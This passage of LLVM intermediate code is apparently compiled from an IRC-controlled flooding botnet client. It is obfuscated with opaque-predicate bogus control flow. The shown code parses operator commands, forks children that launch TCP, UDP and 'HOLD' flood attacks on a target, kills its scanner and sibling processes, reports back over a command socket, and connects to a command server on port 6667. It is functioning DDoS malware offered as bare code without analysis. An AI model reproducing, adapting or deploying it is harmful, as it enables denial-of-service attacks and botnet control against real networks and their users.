; <label>:893:                                    ; preds = %originalBBpart2120, %originalBBpart2112, %821, %815, %809, %803, %800
  br label %1178

; <label>:894:                                    ; preds = %originalBBpart2120, %originalBBpart2116
  %895 = load i8**, i8*** %4, align 8
  %896 = getelementptr inbounds i8*, i8** %895, i64 1
  %897 = load i8*, i8** %896, align 8
  store i8* %897, i8** %22, align 8
  %898 = load i8**, i8*** %4, align 8
  %899 = getelementptr inbounds i8*, i8** %898, i64 2
  %900 = load i8*, i8** %899, align 8
  %901 = call i32 @atoi(i8* %900) #10
  store i32 %901, i32* %23, align 4
  %902 = load i8**, i8*** %4, align 8
  %903 = getelementptr inbounds i8*, i8** %902, i64 3
  %904 = load i8*, i8** %903, align 8
  %905 = call i32 @atoi(i8* %904) #10
  store i32 %905, i32* %24, align 4
  %906 = load i8**, i8*** %4, align 8
  %907 = getelementptr inbounds i8*, i8** %906, i64 4
  %908 = load i8*, i8** %907, align 8
  %909 = call i32 @atoi(i8* %908) #10
  store i32 %909, i32* %25, align 4
  %910 = load i8**, i8*** %4, align 8
  %911 = getelementptr inbounds i8*, i8** %910, i64 5
  %912 = load i8*, i8** %911, align 8
  store i8* %912, i8** %26, align 8
  %913 = load i32, i32* %3, align 4
  %914 = icmp eq i32 %913, 8
  br i1 %914, label %915, label %920

; <label>:915:                                    ; preds = %894
  %916 = load i8**, i8*** %4, align 8
  %917 = getelementptr inbounds i8*, i8** %916, i64 7
  %918 = load i8*, i8** %917, align 8
  %919 = call i32 @atoi(i8* %918) #10
  br label %937

; <label>:920:                                    ; preds = %894
  %921 = load i32, i32* @x.73
  %922 = load i32, i32* @y.74
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %920
  %929 = load i32, i32* @x.73
  %930 = load i32, i32* @y.74
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %937

; <label>:937:                                    ; preds = %originalBBpart2124, %915
  %938 = phi i32 [ %919, %915 ], [ 10, %originalBBpart2124 ]
  store i32 %938, i32* %27, align 4
  %939 = load i32, i32* %3, align 4
  %940 = icmp sgt i32 %939, 6
  br i1 %940, label %941, label %946

; <label>:941:                                    ; preds = %937
  %942 = load i8**, i8*** %4, align 8
  %943 = getelementptr inbounds i8*, i8** %942, i64 6
  %944 = load i8*, i8** %943, align 8
  %945 = call i32 @atoi(i8* %944) #10
  br label %947

; <label>:946:                                    ; preds = %937
  br label %947

; <label>:947:                                    ; preds = %946, %941
  %948 = phi i32 [ %945, %941 ], [ 0, %946 ]
  %949 = load i32, i32* @x.73
  %950 = load i32, i32* @y.74
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %947
  store i32 %948, i32* %28, align 4
  %957 = load i8*, i8** %22, align 8
  %958 = call i8* @strstr(i8* %957, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %959 = icmp ne i8* %958, null
  %960 = load i32, i32* @x.73
  %961 = load i32, i32* @y.74
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %959, label %968, label %1004

; <label>:968:                                    ; preds = %originalBBpart2128
  %969 = load i8*, i8** %22, align 8
  %970 = call i8* @strtok(i8* %969, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %970, i8** %29, align 8
  br label %971

; <label>:971:                                    ; preds = %1001, %968
  %972 = load i32, i32* @x.73
  %973 = load i32, i32* @y.74
  %974 = sub i32 %972, 1
  %975 = mul i32 %972, %974
  %976 = urem i32 %975, 2
  %977 = icmp eq i32 %976, 0
  %978 = icmp slt i32 %973, 10
  %979 = or i1 %977, %978
  br i1 %979, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %971
  %980 = load i8*, i8** %29, align 8
  %981 = icmp ne i8* %980, null
  %982 = load i32, i32* @x.73
  %983 = load i32, i32* @y.74
  %984 = sub i32 %982, 1
  %985 = mul i32 %982, %984
  %986 = urem i32 %985, 2
  %987 = icmp eq i32 %986, 0
  %988 = icmp slt i32 %983, 10
  %989 = or i1 %987, %988
  br i1 %989, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %981, label %990, label %1003

; <label>:990:                                    ; preds = %originalBBpart2132
  %991 = call i32 @listFork()
  %992 = icmp ne i32 %991, 0
  br i1 %992, label %1001, label %993

; <label>:993:                                    ; preds = %990
  %994 = load i8*, i8** %29, align 8
  %995 = load i32, i32* %23, align 4
  %996 = load i32, i32* %24, align 4
  %997 = load i32, i32* %25, align 4
  %998 = load i8*, i8** %26, align 8
  %999 = load i32, i32* %28, align 4
  %1000 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %994, i32 %995, i32 %996, i32 %997, i8* %998, i32 %999, i32 %1000)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1001:                                   ; preds = %990
  %1002 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %1002, i8** %29, align 8
  br label %971

; <label>:1003:                                   ; preds = %originalBBpart2132
  br label %1032

; <label>:1004:                                   ; preds = %originalBBpart2128
  %1005 = load i32, i32* @x.73
  %1006 = load i32, i32* @y.74
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1004
  %1013 = call i32 @listFork()
  %1014 = icmp ne i32 %1013, 0
  %1015 = load i32, i32* @x.73
  %1016 = load i32, i32* @y.74
  %1017 = sub i32 %1015, 1
  %1018 = mul i32 %1015, %1017
  %1019 = urem i32 %1018, 2
  %1020 = icmp eq i32 %1019, 0
  %1021 = icmp slt i32 %1016, 10
  %1022 = or i1 %1020, %1021
  br i1 %1022, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1014, label %1023, label %1024

; <label>:1023:                                   ; preds = %originalBBpart2136
  br label %1178

; <label>:1024:                                   ; preds = %originalBBpart2136
  %1025 = load i8*, i8** %22, align 8
  %1026 = load i32, i32* %23, align 4
  %1027 = load i32, i32* %24, align 4
  %1028 = load i32, i32* %25, align 4
  %1029 = load i8*, i8** %26, align 8
  %1030 = load i32, i32* %28, align 4
  %1031 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %1025, i32 %1026, i32 %1027, i32 %1028, i8* %1029, i32 %1030, i32 %1031)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1032:                                   ; preds = %1003
  br label %1033

; <label>:1033:                                   ; preds = %1032, %originalBBpart2108
  %1034 = load i8**, i8*** %4, align 8
  %1035 = getelementptr inbounds i8*, i8** %1034, i64 0
  %1036 = load i8*, i8** %1035, align 8
  %1037 = call i32 @strcmp(i8* %1036, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)) #10
  %1038 = icmp ne i32 %1037, 0
  br i1 %1038, label %1155, label %1039

; <label>:1039:                                   ; preds = %1033
  %1040 = load i32, i32* @x.73
  %1041 = load i32, i32* @y.74
  %1042 = sub i32 %1040, 1
  %1043 = mul i32 %1040, %1042
  %1044 = urem i32 %1043, 2
  %1045 = icmp eq i32 %1044, 0
  %1046 = icmp slt i32 %1041, 10
  %1047 = or i1 %1045, %1046
  br i1 %1047, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1039
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  %1048 = load i32, i32* @x.73
  %1049 = load i32, i32* @y.74
  %1050 = sub i32 %1048, 1
  %1051 = mul i32 %1048, %1050
  %1052 = urem i32 %1051, 2
  %1053 = icmp eq i32 %1052, 0
  %1054 = icmp slt i32 %1049, 10
  %1055 = or i1 %1053, %1054
  br i1 %1055, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1056

; <label>:1056:                                   ; preds = %1098, %originalBBpart2140
  %1057 = load i64, i64* %31, align 8
  %1058 = load i64, i64* @numpids, align 8
  %1059 = icmp ult i64 %1057, %1058
  br i1 %1059, label %1060, label %1101

; <label>:1060:                                   ; preds = %1056
  %1061 = load i32, i32* @x.73
  %1062 = load i32, i32* @y.74
  %1063 = sub i32 %1061, 1
  %1064 = mul i32 %1061, %1063
  %1065 = urem i32 %1064, 2
  %1066 = icmp eq i32 %1065, 0
  %1067 = icmp slt i32 %1062, 10
  %1068 = or i1 %1066, %1067
  br i1 %1068, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1060
  %1069 = load i32*, i32** @pids, align 8
  %1070 = load i64, i64* %31, align 8
  %1071 = getelementptr inbounds i32, i32* %1069, i64 %1070
  %1072 = load i32, i32* %1071, align 4
  %1073 = icmp ne i32 %1072, 0
  %1074 = load i32, i32* @x.73
  %1075 = load i32, i32* @y.74
  %1076 = sub i32 %1074, 1
  %1077 = mul i32 %1074, %1076
  %1078 = urem i32 %1077, 2
  %1079 = icmp eq i32 %1078, 0
  %1080 = icmp slt i32 %1075, 10
  %1081 = or i1 %1079, %1080
  br i1 %1081, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1073, label %1082, label %1097

; <label>:1082:                                   ; preds = %originalBBpart2144
  %1083 = load i32*, i32** @pids, align 8
  %1084 = load i64, i64* %31, align 8
  %1085 = getelementptr inbounds i32, i32* %1083, i64 %1084
  %1086 = load i32, i32* %1085, align 4
  %1087 = call i32 @getpid() #2
  %1088 = icmp ne i32 %1086, %1087
  br i1 %1088, label %1089, label %1097

; <label>:1089:                                   ; preds = %1082
  %1090 = load i32*, i32** @pids, align 8
  %1091 = load i64, i64* %31, align 8
  %1092 = getelementptr inbounds i32, i32* %1090, i64 %1091
  %1093 = load i32, i32* %1092, align 4
  %1094 = call i32 @kill(i32 %1093, i32 9) #2
  %1095 = load i32, i32* %30, align 4
  %1096 = add nsw i32 %1095, 1
  store i32 %1096, i32* %30, align 4
  br label %1097

; <label>:1097:                                   ; preds = %1089, %1082, %originalBBpart2144
  br label %1098

; <label>:1098:                                   ; preds = %1097
  %1099 = load i64, i64* %31, align 8
  %1100 = add i64 %1099, 1
  store i64 %1100, i64* %31, align 8
  br label %1056

; <label>:1101:                                   ; preds = %1056
  %1102 = load i32, i32* @x.73
  %1103 = load i32, i32* @y.74
  %1104 = sub i32 %1102, 1
  %1105 = mul i32 %1102, %1104
  %1106 = urem i32 %1105, 2
  %1107 = icmp eq i32 %1106, 0
  %1108 = icmp slt i32 %1103, 10
  %1109 = or i1 %1107, %1108
  br i1 %1109, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1101
  %1110 = load i32, i32* %30, align 4
  %1111 = icmp sgt i32 %1110, 0
  %1112 = load i32, i32* @x.73
  %1113 = load i32, i32* @y.74
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1111, label %1120, label %1137

; <label>:1120:                                   ; preds = %originalBBpart2148
  %1121 = load i32, i32* @x.73
  %1122 = load i32, i32* @y.74
  %1123 = sub i32 %1121, 1
  %1124 = mul i32 %1121, %1123
  %1125 = urem i32 %1124, 2
  %1126 = icmp eq i32 %1125, 0
  %1127 = icmp slt i32 %1122, 10
  %1128 = or i1 %1126, %1127
  br i1 %1128, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1120
  %1129 = load i32, i32* @x.73
  %1130 = load i32, i32* @y.74
  %1131 = sub i32 %1129, 1
  %1132 = mul i32 %1129, %1131
  %1133 = urem i32 %1132, 2
  %1134 = icmp eq i32 %1133, 0
  %1135 = icmp slt i32 %1130, 10
  %1136 = or i1 %1134, %1135
  br i1 %1136, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1154

; <label>:1137:                                   ; preds = %originalBBpart2148
  %1138 = load i32, i32* @x.73
  %1139 = load i32, i32* @y.74
  %1140 = sub i32 %1138, 1
  %1141 = mul i32 %1138, %1140
  %1142 = urem i32 %1141, 2
  %1143 = icmp eq i32 %1142, 0
  %1144 = icmp slt i32 %1139, 10
  %1145 = or i1 %1143, %1144
  br i1 %1145, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1137
  %1146 = load i32, i32* @x.73
  %1147 = load i32, i32* @y.74
  %1148 = sub i32 %1146, 1
  %1149 = mul i32 %1146, %1148
  %1150 = urem i32 %1149, 2
  %1151 = icmp eq i32 %1150, 0
  %1152 = icmp slt i32 %1147, 10
  %1153 = or i1 %1151, %1152
  br i1 %1153, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1154

; <label>:1154:                                   ; preds = %originalBBpart2156, %originalBBpart2152
  br label %1155

; <label>:1155:                                   ; preds = %1154, %1033
  %1156 = load i32, i32* @x.73
  %1157 = load i32, i32* @y.74
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1155
  %1164 = load i8**, i8*** %4, align 8
  %1165 = getelementptr inbounds i8*, i8** %1164, i64 0
  %1166 = load i8*, i8** %1165, align 8
  %1167 = call i32 @strcmp(i8* %1166, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0)) #10
  %1168 = icmp ne i32 %1167, 0
  %1169 = load i32, i32* @x.73
  %1170 = load i32, i32* @y.74
  %1171 = sub i32 %1169, 1
  %1172 = mul i32 %1169, %1171
  %1173 = urem i32 %1172, 2
  %1174 = icmp eq i32 %1173, 0
  %1175 = icmp slt i32 %1170, 10
  %1176 = or i1 %1174, %1175
  br i1 %1176, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1168, label %1178, label %1177

; <label>:1177:                                   ; preds = %originalBBpart2160
  call void @exit(i32 0) #14
  unreachable

; <label>:1178:                                   ; preds = %originalBBpart2160, %1023, %893, %originalBBpart2100, %585, %originalBBpart260, %originalBBpart252, %365, %298, %originalBBpart236, %originalBBpart232, %originalBBpart228, %originalBBpart216, %originalBBpart28, %originalBBpart24, %originalBBpart2
  %1179 = load i32, i32* @x.73
  %1180 = load i32, i32* @y.74
  %1181 = sub i32 %1179, 1
  %1182 = mul i32 %1179, %1181
  %1183 = urem i32 %1182, 2
  %1184 = icmp eq i32 %1183, 0
  %1185 = icmp slt i32 %1180, 10
  %1186 = or i1 %1184, %1185
  br i1 %1186, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1178
  %1187 = load i32, i32* @x.73
  %1188 = load i32, i32* @y.74
  %1189 = sub i32 %1187, 1
  %1190 = mul i32 %1187, %1189
  %1191 = urem i32 %1190, 2
  %1192 = icmp eq i32 %1191, 0
  %1193 = icmp slt i32 %1188, 10
  %1194 = or i1 %1192, %1193
  br i1 %1194, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %37
  %1195 = load i32, i32* @mainCommSock, align 4
  %1196 = call i32 (i32, i8*, ...) @sockprintf(i32 %1195, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %1197 = load i32, i32* @mainCommSock, align 4
  %1198 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1199 = call i8* @inet_ntoa(i32 %1198) #2
  %1200 = call i32 (i32, i8*, ...) @sockprintf(i32 %1197, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* %1199)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %92
  %1201 = load i32, i32* @mainCommSock, align 4
  %1202 = call i32 (i32, i8*, ...) @sockprintf(i32 %1201, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.47, i32 0, i32 0))
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %117
  %1203 = load i32, i32* @scanPid, align 4
  %1204 = icmp eq i32 %1203, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %153
  %1205 = load i32, i32* @scanPid, align 4
  %1206 = call i32 @kill(i32 %1205, i32 9) #2
  %1207 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %179
  %1208 = load i32, i32* @scanPid, align 4
  %1209 = icmp ne i32 %1208, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %198
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %220
  %1210 = load i32, i32* %6, align 4
  store i32 %1210, i32* @scanPid, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %241
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %270
  %1211 = load i8**, i8*** %4, align 8
  %1212 = getelementptr inbounds i8*, i8** %1211, i64 2
  %1213 = load i8*, i8** %1212, align 8
  %1214 = call i32 @atoi(i8* %1213) #10
  %1215 = icmp slt i32 %1214, 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %317
  %1216 = load i8*, i8** %10, align 8
  %1217 = icmp ne i8* %1216, null
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %339
  %1218 = load i8*, i8** %10, align 8
  %1219 = load i32, i32* %8, align 4
  %1220 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %1218, i32 %1219, i32 %1220)
  call void @_exit(i32 0) #12
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %392
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %441
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %461
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %498
  %1221 = load i8**, i8*** %4, align 8
  %1222 = getelementptr inbounds i8*, i8** %1221, i64 2
  %1223 = load i8*, i8** %1222, align 8
  %1224 = call i32 @atoi(i8* %1223) #10
  %1225 = icmp eq i32 %1224, -1
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %520
  %1226 = load i8**, i8*** %4, align 8
  %1227 = getelementptr inbounds i8*, i8** %1226, i64 4
  %1228 = load i8*, i8** %1227, align 8
  %1229 = call i32 @atoi(i8* %1228) #10
  %1230 = icmp eq i32 %1229, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %563
  %1231 = load i8**, i8*** %4, align 8
  %1232 = getelementptr inbounds i8*, i8** %1231, i64 6
  %1233 = load i8*, i8** %1232, align 8
  %1234 = call i32 @atoi(i8* %1233) #10
  %1235 = icmp slt i32 %1234, 1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %586
  %1236 = load i8**, i8*** %4, align 8
  %1237 = getelementptr inbounds i8*, i8** %1236, i64 1
  %1238 = load i8*, i8** %1237, align 8
  store i8* %1238, i8** %15, align 8
  %1239 = load i8**, i8*** %4, align 8
  %1240 = getelementptr inbounds i8*, i8** %1239, i64 2
  %1241 = load i8*, i8** %1240, align 8
  %1242 = call i32 @atoi(i8* %1241) #10
  store i32 %1242, i32* %16, align 4
  %1243 = load i8**, i8*** %4, align 8
  %1244 = getelementptr inbounds i8*, i8** %1243, i64 3
  %1245 = load i8*, i8** %1244, align 8
  %1246 = call i32 @atoi(i8* %1245) #10
  store i32 %1246, i32* %17, align 4
  %1247 = load i8**, i8*** %4, align 8
  %1248 = getelementptr inbounds i8*, i8** %1247, i64 4
  %1249 = load i8*, i8** %1248, align 8
  %1250 = call i32 @atoi(i8* %1249) #10
  store i32 %1250, i32* %18, align 4
  %1251 = load i8**, i8*** %4, align 8
  %1252 = getelementptr inbounds i8*, i8** %1251, i64 5
  %1253 = load i8*, i8** %1252, align 8
  %1254 = call i32 @atoi(i8* %1253) #10
  store i32 %1254, i32* %19, align 4
  %1255 = load i32, i32* %3, align 4
  %1256 = icmp eq i32 %1255, 7
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %624
  %1257 = load i8**, i8*** %4, align 8
  %1258 = getelementptr inbounds i8*, i8** %1257, i64 6
  %1259 = load i8*, i8** %1258, align 8
  %1260 = call i32 @atoi(i8* %1259) #10
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %654
  %1261 = load i8*, i8** %21, align 8
  %1262 = icmp ne i8* %1261, null
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %676
  %1263 = load i8*, i8** %21, align 8
  %1264 = load i32, i32* %16, align 4
  %1265 = load i32, i32* %17, align 4
  %1266 = load i32, i32* %18, align 4
  %1267 = load i32, i32* %19, align 4
  %1268 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %1263, i32 %1264, i32 %1265, i32 %1266, i32 %1267, i32 %1268)
  call void @_exit(i32 0) #12
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %701
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %718
  %1269 = call i32 @listFork()
  %1270 = icmp ne i32 %1269, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %737
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %761
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %778
  %1271 = load i8**, i8*** %4, align 8
  %1272 = getelementptr inbounds i8*, i8** %1271, i64 0
  %1273 = load i8*, i8** %1272, align 8
  %1274 = call i32 @strcmp(i8* %1273, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %1275 = icmp ne i32 %1274, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %830
  %1276 = load i8**, i8*** %4, align 8
  %1277 = getelementptr inbounds i8*, i8** %1276, i64 6
  %1278 = load i8*, i8** %1277, align 8
  %1279 = call i32 @atoi(i8* %1278) #10
  %1280 = icmp slt i32 %1279, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %852
  %1281 = load i32, i32* %3, align 4
  %1282 = icmp eq i32 %1281, 8
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %871
  %1283 = load i8**, i8*** %4, align 8
  %1284 = getelementptr inbounds i8*, i8** %1283, i64 7
  %1285 = load i8*, i8** %1284, align 8
  %1286 = call i32 @atoi(i8* %1285) #10
  %1287 = icmp slt i32 %1286, 1
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %920
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %947
  store i32 %948, i32* %28, align 4
  %1288 = load i8*, i8** %22, align 8
  %1289 = call i8* @strstr(i8* %1288, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %1290 = icmp ne i8* %1289, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %971
  %1291 = load i8*, i8** %29, align 8
  %1292 = icmp ne i8* %1291, null
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1004
  %1293 = call i32 @listFork()
  %1294 = icmp ne i32 %1293, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1039
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1060
  %1295 = load i32*, i32** @pids, align 8
  %1296 = load i64, i64* %31, align 8
  %1297 = getelementptr inbounds i32, i32* %1295, i64 %1296
  %1298 = load i32, i32* %1297, align 4
  %1299 = icmp ne i32 %1298, 0
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1101
  %1300 = load i32, i32* %30, align 4
  %1301 = icmp sgt i32 %1300, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1120
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1137
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1155
  %1302 = load i8**, i8*** %4, align 8
  %1303 = getelementptr inbounds i8*, i8** %1302, i64 0
  %1304 = load i8*, i8** %1303, align 8
  %1305 = call i32 @strcmp(i8* %1304, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0)) #10
  %1306 = icmp ne i32 %1305, 0
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1178
  br label %originalBB162
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.75
  %9 = load i32, i32* @y.76
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.75
  %19 = load i32, i32* @y.76
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* @currentServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #2
  store i32 6667, i32* %3, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #10
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #10
  store i32 %49, i32* %3, align 4
